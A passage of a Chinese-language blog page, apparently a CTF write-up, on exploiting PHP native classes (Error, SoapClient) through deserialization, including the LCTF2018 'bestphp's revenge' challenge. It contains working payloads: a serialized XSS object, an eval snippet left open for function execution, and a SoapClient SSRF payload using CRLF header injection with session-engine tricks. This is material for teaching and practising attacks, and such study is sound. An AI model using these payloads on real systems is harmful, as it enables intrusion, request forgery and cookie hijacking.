+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> urlencode(serialize(<span style="color:#b8860b">$a</span>));
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>得到:</p>
+<blockquote>
+<p>O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A29%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Cerror.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</p>
+</blockquote>
+<p>将以上字符串赋给cmd就可以看到弹框：</p>
+<p><p class="markdown-image">
+  <img src="/img/39.png" alt="alt text"  />
+</p></p>
+<ul>
+<li>Error 命令执行</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;a&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;b&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">eval</span>(<span style="color:#b44">&#34;echo new </span><span style="color:#b68;font-weight:bold">$a</span><span style="color:#b44">(</span><span style="color:#b68;font-weight:bold">$b</span><span style="color:#b44">());&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>此时通过传<code>?a=Error&amp;b=phpinfo</code>就可以执行命令</p>
+<p><p class="markdown-image">
+  <img src="/img/40.png" alt="alt text"  />
+</p></p>
+<ol start="2">
+<li>SoapClient类的使用</li>
+</ol>
+<p>SOAP 是一种简单的基于 XML 的协议，它使应用程序通过 HTTP 来交换信息。php中的soapClient类可以创建soap数据报文，与wsdl接口进行交互,而WSDL文件是描述SOAP服务的接口。</p>
+<p>SoapClient类的构造函数如下：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">public</span> SoapClient <span style="color:#666">::</span> <span style="color:#b44">SoapClient</span> （mixed <span style="color:#b8860b">$wsdl</span> [，array <span style="color:#b8860b">$options</span> ]）
+</span></span></code></pre></div><p>第一个参数是用来指明是否是wsdl模式。</p>
+<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
+<p>示例：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> SoapClient(<span style="color:#a2f;font-weight:bold">null</span>,<span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;location&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;http://127.0.0.1/flag.php&#34;</span>,<span style="color:#b44">&#39;uri&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;123&#34;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> urlencode(serialize(<span style="color:#b8860b">$a</span>));
+</span></span></code></pre></div><p><strong>bestphp‘revenge</strong></p>
+<p>知识点：</p>
+<ol>
+<li>
+<p>session反序列化</p>
+</li>
+<li>
+<p>原生类SoapClient的SSRF</p>
+</li>
+<li>
+<p>extract()变量覆盖</p>
+</li>
+<li>
+<p>CRLF</p>
+</li>
+</ol>
+<p>题目打开看到源码如下：</p>
+<p><p class="markdown-image">
+  <img src="/img/49.png" alt="alt text"  />
+</p></p>
+<p>dirsearch扫描发现flag.php</p>
+<p><p class="markdown-image">
+  <img src="/img/50.png" alt="alt text"  />
+</p></p>
+<p>于是访问：</p>
+<p><p class="markdown-image">
+  <img src="/img/51.png" alt="alt text"  />
+</p></p>
+<p>提示要localhost，暗示ssrf,又有session,说明要用到session反序列化，利用php原生类实现ssrf。</p>
+<p>现在来分析一下题目源码：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#800">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;implode&#39;</span>;
+</span></span><span style="display:flex;"><span>call_user_func(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;f&#39;</span>], <span style="color:#b8860b">$_POST</span>);
+</span></span><span style="display:flex;"><span>session_start();
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span> (isset(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;name&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;name&#39;</span>] <span style="color:#666">=</span> <span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;name&#39;</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>var_dump(<span style="color:#b8860b">$_SESSION</span>);
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">array</span>(reset(<span style="color:#b8860b">$_SESSION</span>), <span style="color:#b44">&#39;welcome_to_the_lctf2018&#39;</span>);
+</span></span><span style="display:flex;"><span>call_user_func(<span style="color:#b8860b">$b</span>, <span style="color:#b8860b">$a</span>);
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>思路：</p>
+<ol>
+<li>
+<p>$b虽然已经给了初值，但能利用这行<code>call_user_func($_GET['f'], $_POST);</code>实现值覆盖。</p>
+</li>
+<li>
+<p>利用session_start()指定php_serialize做序列化引擎，因为反序列化默认引擎是php,将ssrf序列化内容前加<code>|</code>后通过name就可以存储我们构造的session。</p>
+</li>
+<li>
+<p>再看到这行<code>call_user_func($b, $a);</code>想到可以让$b覆盖为<code>call_user_func</code>,此时就变成<code>call_user_func(call_user_func,array($_session,‘welcome_to_the_lctf2018’));</code>,$session这个对象会去调用<code>welcome_to_the_lctf2018</code>这个不存在方法,触发call，服务器就会携带我们设置的cookie去访问flag.php。</p>
+</li>
+</ol>
+<p>构造ssrf内容:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$target</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;http://127.0.0.1/flag.php&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> SoapClient(<span style="color:#a2f;font-weight:bold">null</span>,<span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;location&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b8860b">$target</span>,
+</span></span><span style="display:flex;"><span>   	 <span style="color:#b44">&#39;user_agent&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;npfs</span><span style="color:#b62;font-weight:bold">\r\n</span><span style="color:#b44">Cookie:PHPSESSID=123456</span><span style="color:#b62;font-weight:bold">\r\n</span><span style="color:#b44">&#34;</span>,
+</span></span><span style="display:flex;"><span>   	 <span style="color:#b44">&#39;uri&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;http://127.0.0.1/&#34;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$se</span> <span style="color:#666">=</span> serialize(<span style="color:#b8860b">$b</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;|&#34;</span> <span style="color:#666">.</span> urlencode(<span style="color:#b8860b">$se</span>);
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>浏览器打开得到如下字符串：</p>
+<blockquote>
+<p>|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A31%3A%22npfs%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</p>
+</blockquote>
+<p>指定序列化引擎：</p>
+<p><p class="markdown-image">
+  <img src="/img/52.png" alt="alt text"  />
+</p></p>
+<p>利用extract函数覆盖b的值并修改cookie即可：</p>
+<p><p class="markdown-image">
+  <img src="/img/53.png" alt="alt text"  />
 </p></p>
     </div>
 
